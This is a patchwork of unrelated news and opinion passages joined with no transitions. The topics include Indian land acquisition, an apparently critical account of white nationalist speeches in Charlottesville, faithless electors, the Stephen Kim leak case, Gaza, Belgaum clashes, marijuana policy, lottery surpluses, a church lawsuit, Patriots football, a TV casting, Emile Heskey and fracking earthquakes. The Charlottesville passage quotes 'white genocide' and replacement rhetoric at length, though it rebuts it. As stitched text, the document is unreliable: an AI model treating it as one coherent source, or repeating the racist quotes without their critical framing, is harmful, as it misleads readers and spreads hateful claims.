Jairam Ramesh has honestly admitted that, so far, in most cases R&R has not kept pace with acquisition. In many cases, the time gap has exceeded several decades. He would do well to start from scratch and examine the genesis of the problem caused by the Land Acquisition Act, 1894, and the tinkering that was done to it, particularly at the time of introduction of Schedule IX to the Constitution.

Recently there has been something of an uproar over the removal of several statues dedicated to the “Lost Cause” of the Confederacy. Many Southern communities have elected to take down these monuments in the name of anti-racism and inclusivity. In late April, the city of Louisiana began the process of removing four pro-Confederate monuments to Robert E. Lee, P.G.T. Beauregard, Jefferson Davis, and the Battle of Liberty Place.
The Battle of Liberty Place monument commemorated the 1874 attempt by the Crescent City White League — a white terrorist organization — to overthrow the Republican state government. In 1932 an inscription was added to the monument denouncing the “carpetbag government” of Louisiana, but added that “the national election of November 1876 recognized white supremacy in the South and gave us our state.” On April 24, 2017, the statue was taken down in the dead of night as police snipers stood guard on nearby rooftops — a response to violent threats by monument supporters.
The city of New Orleans then proceeded to take down the statues of Jefferson Davis on May 11th, P.G.T. Beauregard on May 17th, and Robert E. Lee on May 19th. For some people, this decision was an affront to history and tradition. To others it was another example of a major U.S. city capitulating to the forces of political correctness. For white nationalists, Southern nationalists, neo-Confederates, and others on the racist Right, it only meant one thing: the continued ethnic cleansing of the majority white population.
Indeed, the movement collectively known as the “alt-right” has been abuzz with the usual cries of “white genocide” and “white displacement.” On May 13th, 2017, the aforementioned hodgepodge of far-right activists descended on Charlottesville, VA to “defend” the statues of Robert E. Lee and “Stonewall” Jackson. A host of familiar faces — Richard Spencer, Sam Dickson, Mike Peinovich — took turns speaking with a bullhorn while others stood, listening intently and holding Confederate and Identity Evropa flags.
Peinovich claimed this was about more than just Confederate monuments. To him the controversy is removing “images of white people” and “white heroes” and “white warriors” in order to “attack and demoralize” whites. “They wanna destroy our future, they wanna replace us with some sort of mixed, muddy people that would just be easy consumers who won't stand up for themselves, who'll just go buy, shop, be part of the cogs of the machine,” he said.
And he warned the crowd that it won't end with statues dedicated to the Confederacy either. “It's not gonna stop with Robert E. Lee. It's not gonna stop with Jefferson Davis. They're gonna go after Andrew Jackson. They're gonna go after Thomas Jefferson. They're gonna go all the way back, as we said, to Shakespeare. They're gonna go after any white person that was a hero, that represented Europe, that represented white culture, white civilization.”
Then the bullhorn was passed to Spencer, who stated that he and the alt-right were taking the angst and unease of millions of white people and putting it into words. “This is not like a genocide of yesteryear,” he said. “This is not a war with bullets and trenches and tanks. This is a psychological war. This is a moral war.” And Spencer vowed to fight this war on the “battlefield of symbolism” and “morality.” Because what Spencer believes his enemies want is “a world in which we do not exist.” Spencer may be partially correct — many people want a future in which he and his compatriots do not exist, but not because of their lack of melanin.
Nonetheless, Spencer claimed that this goal of a world without white people — which again, came from the fevered imagination of white supremacists — would result in a “horrifying parody of the civilization that our ancestors built.” One might add through the blood and sweat of blacks, Asians, Hispanics, and others.
“They are trying to take away our gods. They are trying to take away our ideals. They are trying to take away who we are,” said Spencer. “And in the stead of these monuments, god knows what they're going to erect: some monument to death, some monument to slavery and the Holocaust, some monument to the black cloud that hangs over everyone's heads. Or perhaps quite literally it will be a statue to Lady Gaga, I would not put it past them. They want to memorialize equality. I don't want to live in a world of equality.”
The audience clapped and cheered.
He then proclaimed, “We will not be replaced from this park! We will not be replaced from this world! Whites have a future! We have a future of power! Of beauty! Of expression! [Inaudible] it's a greater civilization than what our ancestors were capable of! That is our future! That is your future! And we will seize it!”
The popular alt-right show Red Ice TV livestreamed the event in its entirety, and, between events, aired discussions with pro-Confederate figures. In one such discussion, hosts Lana Lokteff and Henrik Palmgren spoke to James Edwards of The Political Cesspool podcast and Michael Hill, President of the neo-Confederate organization League of the South (LoS).
Lokteff asked Hill for his thoughts on what she called the “war on Confederate statues.” Hill replied that “this is simply another example of cultural, ethnic cleansing” and part of an “anti-white purge” of monuments, statues, and flags associated with the South. “But it won't end there, I guarantee you that,” he claimed, adding that once anti-racists finished dismantling statues they will “come for the flesh and blood” of white people.
James Edwards was next to give his take on the possible removal of the Robert E. Lee statue in Charlottesville. Edwards used the controversy to denounce multiculturalism as a “fool's errand” and advocate for racial separation. “Blacks will never view an upright man like Robert E. Lee as their hero, nor will we ever view a degenerate like Martin Luther King as our hero,” he said.
“And once you reach critical mass — and we're fast approaching that point — you're gonna see certainly the genocide of our monuments, and I agree wholeheartedly with Dr. Hill that the day will come and, if present trends persist, in the not-too-distant future they will come after us as flesh and blood beings.” And yes, Edwards actually did call this a “genocide” of monuments — something which I heretofore never knew was actually a thing.
Edwards also called Lee the “epitome of a Christian soldier” and, although we warned that it might sound a tad blasphemous, “the most Christ-like figure that ever trod the North American continent.” He also revealed that every year for “Confederate History Month,” he makes a habit of watching the 2003 film Gods and Generals which boasts a whopping 8% rating on Rotten Tomatoes. The critics consensus lambasted the movie for its “two dimensional characters,” “pompous self-righteousness,” and “pro-Confederate slant.”
Another participant in the discussion, Mencken's Ghost, agreed with both Hill and Edwards, as he called the removal of the statues a form of “genocide” by way of “removing the outward symbols that define a people and their identity.” And at Identity Dixie — a website where Mencken's Ghost co-hosts a pro-Confederate podcast called The Rebel Yell — an anonymous contributor called for a boycott of New Orleans in a May 24th article. “We must lay economic siege and treat New Orleans as the Sodom and Gomorrah on the Mississippi it has become,” he wrote.
Meanwhile, the crowd of protesters had gathered to give speeches, with alt-right activist and Daily Caller contributor Jason Kessler kicking things off by praising his white nationalist brethren for their spirited defense of white supremacy. “I think one thing that I have in common with all of you here today is I don't give a goddamn about being called a racist!” he declared to cheers and applause.
“And that's what it's gonna take as a people: all of you out here, you have the cajones to stand up here and be leaders of our movement, to not apologize for being white, for being European-Americans! These statues are a symbol of our former greatness, and we have to protect them if we are to continue into our greatness in the future. There are so many great things we can accomplish together.”
And like Mike Peinovich previously claimed, Kessler predicted that this was only a slippery slope to removing statues of George Washington and Thomas Jefferson. He said that this “standard” was only “applied to our people.” Which begs the question of what standard Kessler means. If he means that only white slave owners and mass murderers and terrorists are having their statues removed, then maybe he has a point — if not because we in the U.S. do not tend to erect statues of people of color in the first place, let alone hugely controversial ones.
Of course that isn't what he meant by that. Kessler is under the impression that statues of white people in general are being targeted regardless of what those people did in life. And then he conflated the removal of statues of slave owners to ancient relics and historical buildings constructed through slave labor. He asked his audience whether anti-racists wanted to “take down the Great Wall of China because it was built with slave labor,” or the “Mayan and Aztecan pyramids which were built with slave labor.”
The answer is no, since anti-racists can distinguish between historical sites built with slave labor and modern statues celebrating white supremacy. There are no calls to tear down the Pyramids of Giza or the White House because slaves constructed them. So Kessler's claims of anti-white persecution fell totally flat. He then proceeded to thank everyone who made the event possible, including “Eli Mosley,” Nathan Damigo and Identity Evropa, Mike Peinovich, and Sam Dickson.
The next speaker was Identity Evropa (IE) founder Nathan Damigo. Damigo, an Iraq War veteran who did a stint in prison for armed robbery, became nationally famous this year for socking a female antifa protester in the face. IE members are responsible for posting racist flyers at college campuses, often depicting Greco-Roman sculptures and captions like “LET'S BECOME GREAT AGAIN” and “OUR FUTURE BELONGS TO US.”
He began his speech by referencing his infamous sucker-punch, and joked that he had done it in order to take the heat off of Richard Spencer after his Nazi salute video went viral. Several people cheered when he asked how many people in attendance were IE members.
Damigo seemed surprised by the number. “I'm just shocked right now. I never thought that when we started this thing last year that there would be this many people, high-quality, high-agency individuals willing to do what it took to make a difference … This is about people coming together and finding ways to occupy space and bring about a new critical junction in which our people might have a chance again.”
Mike Peinovich took the mic next, and gave a short statement advising folks on the alt-right to point out anti-white hypocrisy to win over normies and ordinary Republicans. For example, by informing them that “it's only our stuff that gets taken down, it's only our ancestors, it's only our heroes that get taken down.” Although one possibility is that he and the rest of the audience are just looking up to the wrong people — traitors, slavers, terrorists, and champions of white supremacy.
Perhaps Peinovich should have listened to Right Stuff contributor Julius Ebola, who called the Confederate statues the “last stand of explicit White Supremacy.” Forgoing any pretense of standing up for “history” or “white heroes,” Ebola noted that it is “impossible to truly defend the Confederacy without defending the racial caste system,” and it is “impossible to defend the racial caste system without valuing Aryans above non-Aryans.” In other words, he recognizes the significance of these statues, what they stand for, and why anti-racists want them brought down in the first place.
And, finally, Sam Dickson stepped up to praise long dead white supremacists like Revilo P. Oliver, an editor at a major Holocaust denial outfit who called Franklin Roosevelt a “diseased and part Jewish monster,” and Wilmot Robertson, author of The Dispossessed Majority (1973) and The Ethnostate (1992) — both of whom he considered his friends. He recalled how most of the people in their movement would stumble into a pitfall of simply reacting to news of black-on-white crime and lamenting how awful it was. This, Dickson pointed out, got them nowhere.
But today, with the Internet's ability to connect millions of people together and spread white nationalist propaganda, today's crop of alt-right activists have an opportunity to organize and introduce their message to everyday people throughout the world. “You are the leaders, you are the change agents,” he informed them. “You are the people who will lead this change, and someday I can hope that some of the people here, there will be statues up to them.” That is because their movement is now offering white people the solution of an ethnostate, or homeland of their own.
A federal judge dealt a deathblow to “faithless electors” who challenged Colorado's law requiring electors to vote for the candidate who won the state's popular vote in November.
A lawsuit was brought forward to set a legal precedent across the United States, unbinding electors from their requirement to vote for the candidate who won the popular vote in their respective states in order to convince enough electors to switch their vote for Hillary Clinton or an establishment Republican, stealing the election from Donald Trump.
United States District Judge Wiley Daniel denied the injunction request from Polly Baca and Robert Nemanich, two Colorado electors who argued that the law binding their vote to Hillary Clinton, the state's popular vote winner, violated their First Amendment rights and the intent of the framers of the Constitution.
Judge Daniel, who was nominated by Bill Clinton in 1995, lambasted the electors for their overt effort to change the law in order to deny Trump the presidency.
“Part of me thinks this is really a political stunt to prevent Donald Trump from becoming president,” he said.
Colorado Secretary of State Wayne Williams sought further clarification from a Denver judge on how to prevent electors from voting for a candidate who did not win the state's popular vote.
Judge Elizabeth Starrs ruled that any elector who fails to do so can be replaced immediately when the Electoral College convenes in Denver on December 19.
The most recent setback for the so-called “faithless elector” movement comes after confirmation that the public relations firm representing them has close ties to Barack Obama, Hillary Clinton and Black Lives Matter.
Megaphone Strategies, which provides “media relations, strategy, and training services to causes doing high-impact work for social justice”, was founded by former Obama “green jobs czar” Van Jones. Molly Haigh, the co-founder and president, worked for Obama's 2008 presidential campaign.
Diane May, the organization's communications manager, worked for Obama's 2008 and 2012 campaigns as well as Bernie Sanders' campaign against Hillary Clinton.
Vien Troung, a Megaphone board member, headlined a fundraiser for Clinton in September; she currently serves as the director of Green for All, an organization founded by Van Jones that has received financial support from George Soros.
A former contractor for the United States government will plead guilty to leaking secret information to a Fox News reporter, his attorney said Friday, and will likely serve 13 months in prison as a result.
The lawyer for Stephen Kim, a 46-year-old former contract analyst for the US Department of State, told District Court Judge Colleen Kollar-Kotelly on Friday that their client is ready to plead guilty to one count of unauthorized disclosure of secret government information, Reuters reported that afternoon.
Prosecutors say Kim disclosed privileged information to Fox News reporter James Rosen in 2009 regarding a possible nuclear test being planned by North Korea in retaliation to sanctions from the west. The next year a grand jury conducted an investigation that ended with them agreeing Kim “knowingly and willfully” shared information “about the military capabilities and preparedness of a particular foreign nation.” As a result he was indicted and charged with making false statements as well as violating the Espionage Act of 1917.
According to a report published by Fox on Friday, a Department of Justice official said the "government's investigation and prosecution of this matter has concluded” upon news that Kim had agreed to enter a plea deal. A federal judge must still approve this plea, which would then cancel plans for a trial previously scheduled to begin this April.
Kirk Stark, the trustee of the Stephen Kim Legal Defense Trust, wrote previously on the support group's website that, “Faced with the impossible choice between admitting to the government's accusations or defending himself against a federal criminal action, Stephen pleaded not guilty and hunkered down for the fight of his life.” Weeks before a trial was expected to begin, however, Kim reportedly changed his plea early Friday.
Rosen of Fox News was never charged for any involvement in the State Dept. leak, but it was revealed in 2012 that the Federal Bureau of Investigation had acquired his phone records and professional emails while conducting the probe into Mr. Kim, and at one point considered the journalist a possible criminal co-conspirator. Coupled with a similar investigation unearthed at that time about a Justice Department investigation into the Associated Press, President Barack Obama and Attorney General Eric Holder agreed last year to reform how the government handles probes involving professional reporters.
Kim is one of eight persons charged under the Espionage Act by the Obama administration for leaking privileged information, a position he holds alongside the likes of WikiLeaks source Chelsea Manning and NSA whistleblowers Thomas Drake and Edward Snowden, among others.
“The Justice Department shows no sign of rethinking its campaign to punish unauthorized disclosures to the news media, with five criminal casesso far under President Obama, compared with three under all previous presidents combined,” New York Times national security reporter Scott Shane wrote in 2011. Since then this number has only increase after the administration pursued Snowden, as well as Navy linguist and a former Central Intelligence Agency officer with Espionage Act charges.
Manning was sentenced to 35 years in prison last August after being convicted by a military judge of espionage and other counts for her role in sharing classified Army documents with the transparency site WikiLeaks. Espionage Act charges against Drake, a former high-ranked official within the secretive intelligence agency, were later dropped after he agreed to plead guilty to a misdemeanor. Former CIA specialist John Kiriakou had less favorable results when he entered a plea deal in 2012. He is currently serving a 30-month sentence after pleading guilty to a single count of disclosing information that identified a covert agent. He had faced upwards of 45 years before the plea agreement was accepted.
Juan Cole writes that the situation in Gaza is predictably causing turmoil in Iraq, and that the Iraqi Air Force made four flights on Wednesday to provide humanitarian and medical aid to Gaza residents, according to the Iraqi Ministry of Defense:
Let me just repeat that. Iraq's air force is carrying aid to the Gazans via Egypt! And when Iraq gets its act together and gets rich from oil and gas, isn't it obvious that the aid will increase significantly?
Never really able to keep himself from making a bad situation worse, George Bush issues his own conditions for a cease-fire.
As Glenn Greenwald has noted, the Democratic Leadership is in complete lockstep with Bush — unilaterally supporting Israel's actions, and placing the full blame on Hamas.
According to the latest Rasmusen poll, however, the American public does not agree with that assessment:
Not only does Rasmussen find that Americans generally "are closely divided over whether the Jewish state should be taking military action against militants in the Gaza Strip" (44-41%, with 15% undecided), but Democratic voters overwhelmingly oppose the Israeli offensive — by a 24-point margin (31-55%). By stark constrast, Republicans, as one would expect (in light of their history of supporting virtually any proposed attack on Arabs and Muslims), overwhelmingly support the Israeli bombing campaign (62-27%).
The United States provides $3 billion a year in military aid to Israel. We're paying for this operation. Yet there is no discussion about how this is affecting our overall interests in the region and hurting our efforts to stabilize Iraq and extricate ourselves militarily.
Reid and Pelosi are representing the Republican minority view quite well. Complete mission fail from Democratic leadership, once again.
Protestors demand merger of Belgaum with Maharashtra. Recent clashes are being blamed on this issue.
A prank SMS circulated in Belgaum by miscreants led to communal clashes resulting in the death of two people in the last 24 hours.
The police have imposed prohibitory orders in several sensitive areas of Belgaum, which is at the centre of a five-decade-old controversy involving Karnataka and Maharashtra.
On Sunday afternoon, a SMS started circulating in Belgaum about an alleged attack on a place of worship by one particular community. Soon, it resulted in a clash between two major communities leading to the death of one person on Sunday evening. The second death was reported on Monday morning after another victim of the clash succumbed to injuries.
Miscreants attacked a bus driver on Monday morning in Gandhinagar area, injuring him seriously. According to the police, the victim, who was unaware of the clashes, was driving the bus belonging to the Karnataka State Road Transport Corporation when he was attacked. His condition is said to be serious.
In all, three cars, two autorickshaws, one KSRTC bus and scores of two-wheelers were damaged in the violence. Houses belonging to a particular community also came under attack. As a precautionary measure, the district administration declared a holiday for schools and colleges in Belgaum on Monday.
"So far, we have arrested 36 people from both communities for causing violence in Belgaum. We are also tracing the origin of the SMS alleging communal violence. The situation is under control now," Belgaum police said,
Additional Director General of Police Bipin Gopalakrishna has been deployed to Belgaum to monitor the situation. The government has rushed additional forces to the district as a precautionary measure.
The communal clashes happened at an inopportune time in Belgaum, which is already reeling under tension because of the dispute between Karnataka and Maharashtra. Both states claim the city falls within their borders.
Though several courts and the Mahajan Commission have ruled out merging Belgaum (which has a dominant Maratha speaking population) into Maharashtra, the neighbouring state has not stopped claiming the city citing linguistic and cultural reasons.
Maharashtra, which approached the Supreme Court two years ago on the same issue, passed a resolution in the state assembly in July this year urging the Centre to declare Belgaum as a Union Territory because it was a "disputed region".
Meanwhile, Karnataka is trying everything to consolidate its position. Suvarna Vidhana Soudha, a colossal building that will house the state's legislature, is nearing completion.
Estimated to cost nearly Rs 450 crore upon completion, Suvarna Vidhana Soudha will see Karnataka's legislature holding its winter session every year in Belgaum.
The Maratha residents of Belgaum treat Suvarna Vidhana Soudha as a "hurdle" in the inclusion of Belgaum into Maharashtra. The city became part of Karnataka during the reorganization of the states on linguistic grounds post Independence.
Pro-Kannada organizations alleged that the communal clashes were "orchestrated" by a section of Belgaum to draw the nation's attention to the city.
"Now that their tactics have failed, they are resorting to such dangerous approaches. We must quell such actions at the initial stage itself," said H Sathya, a leader of Kasturi Kannada Jana Vedike.
My whole family knows that I work for the Drug Policy Alliance and that my job means advocating for the removal of criminal penalties for drug use. Marijuana is often a topic of conversation at our family dinners, so since voters in Colorado and Washington approved marijuana legalization measures on Election Day, I know I should be ready to talk about it again this Thanksgiving.
If the conversation at your Thanksgiving dinner gets boring, you should feel comfortable bringing up marijuana legalization. It's been all over the news since Election Day and public opinion about marijuana legalization is changing rapidly -- from 36 percent in favor and 60 percent opposed in 2006 to 50 percent in favor and 46 percent opposed as of 2011. That's a 28 point swing in just five years. Your family may be more supportive than you think.
Here are five useful talking points for your dinner table conversation about marijuana:
As our executive director Ethan Nadelmann points out, "It would be a mistake to call these ballot initiative victories 'pro-pot.' Most of those who voted in favor don't use marijuana... What moved them was the realization that it made more sense to regulate, tax and control marijuana than to keep wasting money and resources trying to enforce an unenforceable prohibition." The passage of these initiatives only marks the beginning of a long fight ahead. We are bound to see some sort of response from the federal government. For example, the feds' ongoing war on medical marijuana dispensaries quietly continues to threaten patient access. There is a long fight ahead defending and implementing these measures. Marijuana arrests are the driving force of the drug war -- they make up half of the more than 1.5 million annual arrests for drugs. Legalizing marijuana means freeing up resources so law enforcement officials can focus on serious and violent crimes. High school seniors continuously report that they find it easier to acquire marijuana than alcohol. Why? People who sell beer are forced to ask for proper identification but the illicit market doesn't force people who sell drugs to ask their customers for I.D. Regulating marijuana will help ensure that only adults are able to legally purchase marijuana, making it more difficult to wind up in the hands of young people. This is the same way alcohol Prohibition came to an end -- seeing the incredible increases in violence and corruption after pushing alcohol into the illicit market, states experimented with new laws repealing prohibition and ultimately led to the repeal of federal Prohibition.
Thanksgiving is a time to reflect about the past, but it's also an important time to discuss the future. Use this Thanksgiving as an opportunity to hear how your family feels about the war on drugs.

£1.7bn of lottery cash still lying idle in the bank
More than £1.7billion of lottery cash for good causes is still yet to be spent
More than £1.7billion of lottery cash intended for good causes is yet to be spent, it has emerged.
The huge surplus remains despite promises by distributors that the cash mountain - raised from ticket sales - would be dramatically reduced.
The Council for the Advancement of Arts, Recreation and Education last night demanded that the majority of the money be pumped into projects which help steer youngsters away from crime.
Campaigners claimed that, as gang and knife violence threatens to spiral out of control, such a move was vital.
CAARE - the only non-Government body with access to lottery accounts - said the Big Lottery Fund was hoarding £578million.
At the end of March, the National Heritage Memorial Fund also had £567million unused, and the Arts Council England £155million. Sport England had a surplus of almost £202million, and the UK Sports Council £18million.
The total amount - £1,707,672,174 - would easily cover the additional £675million currently being raided from good causes to pay for the hugely-inflated cost of the 2012
London Olympics, it said. Denis Vaughan, president of CAARE, said: 'Without interfering with their income from Camelot, the Prime Minister must use his influence to pressure lottery distribution bodies to invest their massive current surpluses for this urgent purpose, in order to make a real and immediate difference in the fight against gang culture, drug abuse and alcohol excesses.'
The hoarding of huge sums of cash by lottery distributors has been repeatedly highlighted by campaigners and the Daily Mail. Distributors promised ministers as early as 2001 that balances, then standing at £3.4billion, would fall to £1.5billion by 2004.
Yet, more than four years on, the pledge remains unfulfilled.
In 2005, Westminster's Public Accounts Committee said: 'Lottery money does no good sitting in the National Lottery Distribution Fund. Their balances are constantly being replenished as lottery tickets continue to be sold.'
A spokesman for CAARE said: 'They are simply not distributing the funds as intended and often miss even their own targets for doing so. The Big Lottery fund missed its own forecast by an astonishing £100million.'
The organisation has argued the Lottery should give back 'the people's millions' by reducing its surplus to around £200million.
A spokesman for the Department for Culture, Media and Sport - which oversees the Lottery - said: 'The balance has been reduced significantly over the years and is over half the size it was in 2002.
'The money is committed to good causes and ready to be spent when projects need it. Distributors are taking a prudent approach.'
Church Sues After Being “Terrorized” by Gay Activists Kissing
A right-wing Christian group and an anti-gay Michigan church are suing gay activists who “terrorized” the congregation by protesting, distributing leaflets and kissing.
The far-right Alliance Defense Fund is taking on the lawsuit on behalf of Delta Township's Mount Hope Church, which was “invaded” by queers in November.
Accounts of the day differ, of course, but they go something like this: Local activists affiliated with the Bash Back! protested the church, wearing pink bandanas and chanting slogans including “Jesus was a homo”.
That was all just a distraction, though, so other activists wearing their Sunday-best could proceed inside unnoticed. When security guards were lured outside because of the loud protest, two women went to the front of the sanctuary and began kissing, while others threw leaflets over the balcony and unfurled a banner that read, “IT'S OKAY TO BE GAY! BASH BACK!”
The criminal complaint against Bash Back says church members were “terrorized by the Defendants' conduct inside the church,” and that they felt the queers “might be violent.” [Interestingly, the next paragraph notes that the defendant's agreed to move their protest at the request of the pastor. Not exactly “terrorizing” behavior.]
Perhaps my favorite reaction to all of this has been from Catholic League president Bill Donohue:
“If an organized group of gay bashers stormed a gay church, there is not a single sentient person in the United States who wouldn't know about it. This is urban fascism come to America's heartland.”
Urban fascism? If gay bashers “stormed a gay church,” it would be to use physical violence against people because of who they are. That's much different than gay activists using non-violent protest to challenge the ideology that fuels gay bashing (an ideology we could label “suburban fascism,” if we're adopting Donohue's terminology).
Nevertheless, according to the Alliance Defense Fund, this “revealed how dangerous the homosexual agenda is.”
Hmm. You want to talk about “dangerous”? “Dangerous” is not queer kids kissing. “Dangerous” is racists opening fire at a museum. “Dangerous” is right-wingers, espousing many of the same anti-gay, fundamentalist Christian views as these plaintiffs, murdering people.
FOXBOROUGH — The Patriots finished 10 grueling weeks of offseason workouts with one final minicamp practice on Thursday. They plugged their new personnel into the lineup, worked on new schemes, and battled relentlessly on the practice field.
Surely, we have a good grasp of the team's strengths and weaknesses, and can safely say that the Patriots are on their way to competing for a fourth Super Bowl championship.
“With all due respect,” Bill Belichick said this week, “we haven't really done anything on the field.”

Fair enough. Belichick isn't just being a wet blanket. These offseason workouts were a nice way to get back into football and start the 2014 season, but won't have much effect on the games this fall. The practices were non-contact by NFL rule, so we don't really know if the offensive line will be any better this year, if the running game will still be as productive without LeGarrette Blount, and if the defensive line is ready to bring more heat this season.

“We've taught a lot. I think hopefully we've learned a lot,” Belichick said. “But we haven't had the competition that we're going to have in training camp. It's just not the same.”
Still, even though the practices were glorified 7-on-7 passing camps, we can draw some lessons from the Patriots' offseason. Some of the biggest takeaways:
■ There was a lot of talk about guys “playing faster” now that they're in their second year with the Patriots — Danny Amendola, Kenbrell Thompkins, Josh Boyce, and Jamie Collins. Amendola and Thompkins, especially, were impressive. Amendola looks to be developing a good rapport with Tom Brady, and Thompkins was sometimes dominant in drills, getting the better of new cornerback Brandon Browner several times.
That's all well and good, but “playing faster” is straight from “Football Offseason Clichés 101,” along the same lines as players reporting to camp 10 pounds lighter/heavier and in “the best shape of their career.” Amendola and Thompkins looked dominant last offseason and training camp, too, and both faded away during the regular season. It's great that Amendola, Thompkins, Boyce, and Collins are “playing faster” this spring. Whether they can do it in the regular season is a whole different matter.

■ Along the same lines, there's a reason the Patriots signed Brandon LaFell, drafted Michigan receiver Jeremy Gallon in the seventh round, signed three undrafted free agent receivers, and had 12 receivers on the roster before cutting Reggie Dunn on Thursday. The Patriots clearly aren't ready to give Thompkins or Boyce the fifth and final receiver spot (not counting Matthew Slater). And, frankly, they shouldn't, given their struggles as rookies. Gallon could wind up on the practice squad, but at this point I like his chances of making the roster better than Thompkins's or Boyce's. The best chance for one of those two to stick could be if one of the top three receivers — Julian Edelman, LaFell, or Amendola — gets hurt in training camp, or if Aaron Dobson has a setback on his foot injury in camp.
■ Jimmy Garoppolo throws a beautiful ball, and I can watch him rip it in 7-on-7 drills all day. But the kid isn't ready to be the No. 2 quarterback yet, and it would behoove the Patriots to hold onto Ryan Mallett for another season. And that's OK. No one should have expected Garoppolo, who played in the football division formerly known as Division I-AA, to be NFL-ready the second he arrived in Foxborough. There's a lot to like about his game, but Garoppolo had too many fumbles, interceptions, and indecisive moments for the Patriots to entertain trading Mallett. A redshirt year will do Garoppolo well.
■ The Patriots don't seem to have much at tight end behind Rob Gronkowski — Michael Hoomanawanui and undrafted rookies Justin Jones and Asa Watson — but watch out for LaFell playing the “Hernandez” role. “He played all of our wide receiver positions, plus he knew the tight end position,” his former coach, Ron Rivera, told me in March. LaFell was also a “want-to” blocker in Carolina, meaning he doesn't mind getting physical in the run game. Patriots fans, meet your new Swiss Army Knife.
■ Duron Harmon looks like the leader in the clubhouse to win the starting strong safety job. He worked with Darrelle Revis, Browner and Devin McCourty most of the spring, and was smart enough to spend his offseason studying film of some of the top safeties in the game. Logan Ryan looks like a good bet to start the season as the No. 2 cornerback during Browner's four-game suspension. Ryan and Browner should also be cross-trained at safety given the team's relative lack of depth at the position. Revis says he's no longer thinking about his repaired ACL, which is a good sign. And either Tavon Wilson or Patrick Chung won't be with the Patriots in Week 1.
■ Right guard Dan Connolly is probably in trouble this training camp. The coaching staff is high on second-year player Josh Kline, and considering the Patriots can save $3 million by cutting Connolly, we wouldn't be surprised to see him beaten out by Kline, who earned a lot of time with the starting offensive line as Logan Mankins took a break. Four spots on the offensive line seem set — LT Nate Solder, LG Mankins, C Ryan Wendell and RT Sebastian Vollmer — and Kline, Marcus Cannon, Cameron Fleming and Jon Halapio look like good bets to win roster spots.

■ Watch for 5-foot-7-inch running back Roy Finch and 6-8 tight end Justin Jones as undrafted rookies who could make the team — you can't teach speed or height. Running back Brandon Bolden could easily be beaten out by rookie James White for a roster spot. And don't be surprised if either Stephen Houston (6-0, 230) or Jonas Gray (5-10, 225) makes the team in the “Blount” role.
■ Belichick did bring a little levity to the end of Thursday's practice, busting out soccer balls and having some fun with his players before releasing them for a five-week break. But Belichick didn't cancel the final day of minicamp or Organized Team Activities, like he often does. And Belichick didn't have any guests at practices — no Bon Jovi appearances, no college coaches such as Urban Meyer or Brian Kelly observing the festivities. It's possible Belichick invited his guests to one or more of the practices that weren't open to the media. But Belichick didn't mess around in free agency this year, spending big bucks on Revis, Browner, LaFell, and Edelman, and it didn't look like he was messing around this spring, either.

EXCLUSIVE: British actress Georgina Campbell (After Hours) has landed the female lead of Lyta Zod in Krypton, Syfy's Superman prequel pilot from David S. Goyer and Warner Horizon Television.
Based on the DC Comics characters created by Jerry Siegel and Joe Shuster, Krypton is set two generations before the destruction of the legendary Man of Steel's home planet. It follows Superman's grandfather Seg-El — whose House of El was ostracized and shamed — as he fights to redeem his family's honor and save his beloved world from chaos.
Campbell's Lyta Zod is a member of Krypton's military caste and the daughter of a general, Alura Zod. Lyta Zod serves as a cadet — and has also been having a clandestine, forbidden romance with Seg-El (not cast yet).
This marks the U.S. TV debut for Campbell, who won the BAFTA Television Award for Leading Actress in 2015 for Murdered by My Boyfriend. She soon will be seen in the upcoming third season of Broadchurch as well as the feature King Arthur: Legend of the Sword, directed by Guy Ritchie. Campbell is repped by Independent Talent.
David S. Goyer and showrunner Damian Kindler executive produce Krypton for WBTV and Goyer's Phantom Four. Colm McCarthy serves as co-executive producer and will direct the pilot from a story and teleplay by Goyer & Ian Goldberg. The pilot will be filmed in Serbia.
The former England striker Emile Heskey has been the subject of much derision in his home country since the announcement of plans for 'Heskeycam'.
The former Aston Villa forward, who now plays for Australian A-League side Newcastle Jets, was to be the subject of broadcaster Fox Sports's 'Hero Cam', which allows viewers to follow the movements of one player as a camera tracks them throughout the match.
In the pre-match build-up to Newcastle Jets' game against Melbourne Victory this afternoon, Fox said: "Heskey Cam gives you it all: one camera, one hero; every pass, every run, everything Heskey does on the pitch, you'll see it first with the Heskey Cam, the dedicated broadcast providing a rare insight into what makes Heskey so good."

It was quite a build-up for a player most English football fans remember best for holding the ball up for others and scoring just seven goals in 62 England appearances.
Yet Heskey lived up to the billing this afternoon and showed viewers exactly what it is that makes him "so good". The former Liverpool striker was to score twice in a 2-1 victory, the second of which was an incredible bicycle kick. It was the 34-year-old's fourth goal for the Jets in as many matches.
Heskey has become something of a cult figure since moving Down Under, with reports that the Jets had to put in an order for 5,000 more Emile Heskey shirts after their original batch sold out. The Leicester trainee has also been credited with inspiring 1,000 new fans to sign up as members of the the club.

The culprit of earthquakes near fracking sites is not believed to be the act of drilling and fracturing the shale itself, but rather the disposal wells. Disposal wells are the final resting place for used drilling fluid. These waste wells are located thousands of feet underground, encased in layers of concrete. They usually store the waste from several different wells.There are more than 50,000 disposal wells in Texas servicing more than 216,000 active drilling wells, according the the Railroad Commission. Each well uses about 4.5 million gallons of chemical-laced water, according to hydrolicfracturing.com.
“The model I use is called the air hockey table model,” says Cliff Frohlich, a research scientist at the Institute for Geophysics at the University of Texas at Austin. “You have an air hockey table, suppose you tilt it, if there's no air on, the puck will just sit there. Gravity wants it to move but it doesn't because there friction [with the table surface].”
But if you turn the air on for the air hockey table, the puck slips.
“Faults are the same,” he says. If you pump water in a fault, the fault can slip, causing an earthquake.
“Scientists in my community know that injection can sometimes cause earthquakes,” Frohlich says.
The science linking manmade earthquakes to the oil and gas industry isn't anything new.
Decades ago, researchers even found they could turn earthquakes on and off by injecting liquid into the ground, says Dr. William Ellsworth with the Earthquake Science Center of the U.S. Geological Survey.
“This was seen as validation of the effective stress model,” he told StateImpact Texas. “This is work that was published in Science magazine and many other publications.”
Recent research has found definitive links between these disposal wells and earthquakes, particularly in Texas.
The quakes are linked to drilling in Barnett Shale. The productive portion of the Barnett Shale is located directly beneath Johnson, Tarrant and western Dallas counties, about a mile and a half underground. The shale contains an estimated 40 trillion cubic feet of natural gas, making it the largest onshore natural gas field in Texas and potentially in the United States.
A University of Texas at Austin from study last summer found a definitive link between earthquakes in the Dallas-Fort Worth area and disposal wells in the Barnett Shale.
